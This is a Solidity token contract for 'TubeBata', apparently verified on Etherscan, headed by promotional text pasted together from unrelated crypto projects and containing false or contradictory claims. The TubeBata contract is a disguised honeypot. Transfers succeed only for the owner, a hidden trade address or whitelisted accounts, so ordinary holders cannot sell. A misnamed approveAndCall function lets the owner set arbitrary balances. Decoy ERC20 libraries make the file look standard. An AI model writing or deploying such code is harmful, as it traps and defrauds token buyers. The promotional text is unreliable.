/**
 *Submitted for verification at Etherscan.io on 2021-09-22
*/

/*
The TUBATA Token
The Tube Bata Finance token uses the ticker TUBATA. TUBATA is the default currency of the platform and serves three main use cases:
Platform Currency
TUBATA is the default currency for the Tube Bata platform. Users can use TUBATA to pay for transaction fees and also to purchase option products. Transaction fees will be collected into a reserve fund, and the use of this fund will be decided upon via decentralized governance.
User Incentives
To encourage users to deposit assets and incentivize a positive feedback loop, there will be token incentives paid out in TUBATA. It is important for the platform to have initial liquidity to enable the option products to have accurate pricing and optimum profitability.
Governance
TUBATA will function as a governance token for the Tube Bata platform. TUBATA holders will collectively propose and vote on which assets to support, which protocols to integrate, fee ratios, use of reserve funds, and more.

Meet the Core Team:

Serge Levin — https://www.linkedin.com/in/serge-l-00590b168
Kent Osband — https://www.linkedin.com/in/kent-osband-ba549b13
Evelina Lavrova — https://www.linkedin.com/in/evelina-lavrova-58186438
Roadmap

Lets go!
We hope you have come away from this article with a clear understanding of what Tube Bata Finance is bringing to the market, what you can do with it, the function of the TUBATA token, and who the people are behind the project. We are excited to bring our vision into the world and welcome you to join us!


Tube Bata Finance Partners with Bella Protocol to Bring Complex DeFi Financial Products to Users

We are excited to announce that Tube Bata Finance has entered a strategic partnership with Bella Protocol, a suite of open finance products that aims to bring mass adoption to DeFi asset management. Tube Bata Finance is going to offer innovative products such as Double No-Touch Options and Volatility Income Pools for traders to exploit crypto volatility with simplified user experience.
Tube Bata Finance packages interest rate products together with derivatives to offer a wide variety of financial products for users to choose from based on their preferences and goals.
The vision of Tube Bata Finance matches with Bella Protocol’s. Bella Flex Savings v2 facilitates one-click yield farming with auto-compounding and gas fee saver. Currently Bella’s core team is building tools to enable easy access to global liquidity and premier financial service for anyone, anywhere. With this partnership with Tube Bata Finance, we are one step closer to bringing this vision to reality.
Bella Protocol has been a strategic investor since the early stage of Tube Bata Finance. Both parties are exploring ways to integrate and create complex financial products on DEXes across blockchains and emerging DeFi derivatives markets.
About Bella Protocol
Bella Protocol is a suite of open finance products that aims to bring mass adoption to DeFi asset management. Bella’s first yield product, Flex Savings v2 is live on Ethereum with $40 million TVL.
Bella Protocol is backed by Binance Labs and Arrington XRP Capital and several other renowned investors. BEL token is supported on Binance, Bithumb and other major exchanges.
Bella’s core team consists of serial entrepreneurs and blockchain veterans who have tremendous experience and a proven track record in finance, cryptography, blockchain, and engineering.









GAME BATA becomes MaticVerse!
GAME BATA has grown up and become MaticVerse! We as a team, and as a token have evolved, and want to achieve bigger and better things.
The GAME BATA chapter
We started GAME BATA as we saw the positives tokens Babycake and BabyXRP brought to their holders, and we wanted to provide a similar service but rewarding our holders with one of the most sought-after tokens in the cryptoverse, Matic. As big believers in Matic as a layer 2 solution, we thought we could spread our enthusiasm through GAME BATA. Mission accomplished.
As GAME BATA we managed to provide our holders with over 600,000+ Matic tokens which today is the equivalent of over $1million! We also achieved a market cap of $8million at our highest, meaning an 80x for our early investors! We did all this while being listed on ApeSwap. We had to educate thousands of people about ApeSwap as a DEX platform and brought them a huge surge of volume. We also established a collaboration with Polygon themselves! No other ‘meme coin’ has ever established a collaboration with a top 10 token and we are immensely proud to have made history and become the first one. In just our first 5 days we were responsible for their unique holder wallets to increase by 600%!
Why the evolution?
The evolution to MaticVerse, we believed was essential to not fall into the category of being just another meme coin. As a team of experienced individuals within the crypto space, we know we can build something much greater than that, leaving a much bigger impression! However, we will continue to stay true to our original values and provide our holders with Matic reflections.
What direction does the MaticVerse story go in now?
Firstly, our amazing devs have figured out a way of us being able to list on UniSwap, whilst still being able to provide our holders with Matic rewards. UniSwap is THE biggest DEX on BSC and will give us access to a much larger audience, furthermore, it will bring the investors who were apprehensive about using Apeswap, to us. It will also solve several problems such as correct price listing and charts on CoinMarketCap and CoinGecko, live Poocoin trading and live Dextools trading and trending. Another great advantage to relaunching is that it will allow us to build a bridge between the Matic side and the BSC side as we will have the right number of tokens. Our community were huge advocates for this feature, and we always take into consideration their feedback.
Our aim when creating a token was always to provide a long-term solution to the problems, we saw in the BSC space. Our answer to creating longevity to the project was to add utility. What more fun utility is there than art and gaming?!
Our NFT’s and Game plan
Our NFT’s and game will be intertwined with one another, with the NFT’s being the characters from our game. Our first game phase will be a PvE battle game following the story of our characters, The Baby Vengers. Using our 18 unique superheroes, we will have a variety of traits and rarities you can discover by minting them from our NFT crystals. Using these characters, you can level up by defeating villains, earn MaticVerse rewards as you progress, all the while indulging in the immersive gameplay we have to offer.
Game phase 2 will be the introduction of new PvP battle modes where users can battle against each other, and the release of our game as a mobile app on iOS and Android. Releasing on mobile gaming platforms will allow us to tap into a multibillion-dollar market, giving us a stage for limitless growth!
Finally, Game phase 3 will be releasing the game on all console platforms and PC. But most importantly, adding the RPG free-roaming game mode. It will create an incredible experience for our users to roam through the Baby Venger multi-verse, with dynamic quests and levels to explore.
We are excited to reveal more as we get closer to the launch of the game, and we can’t wait to share our products and vision with the World!
MaticVerse is about to go intergalactic! Book your window seat on our spaceship and enjoy the ride!
Launch Dates
We will be relaunching on UniSwap on Monday 23th September and Sushiswap on Monday 20th September.
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract TubeBata {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}